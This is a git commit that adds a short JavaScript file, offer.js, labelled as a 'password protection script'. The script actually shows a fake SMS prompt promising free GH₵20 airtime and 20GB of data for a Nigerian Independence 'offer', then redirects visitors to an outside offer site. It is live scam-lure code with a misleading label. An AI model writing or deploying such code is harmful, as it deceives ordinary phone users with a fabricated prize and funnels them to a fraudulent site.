b49de99a5fb73047ad11686aeaf8624dd5157c9d
kenycruzk <kenycruzk@gmail.com>
2025-09-26 02:52:25 +0100

    Update and rename backkey.js to offer.js

---
+++ offer.js
@@ -0,0 +1,7 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = '20GB Free Data'
+password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 20GB Free Data From NIGERIA INDEPENDENCE Offer, Kindly Press OK to ACTIVATE ','20GB Free Data');
+if (password != '20GB Free Data') {
+location.href='http://independence.alloffer.org/20GB';
+
+}
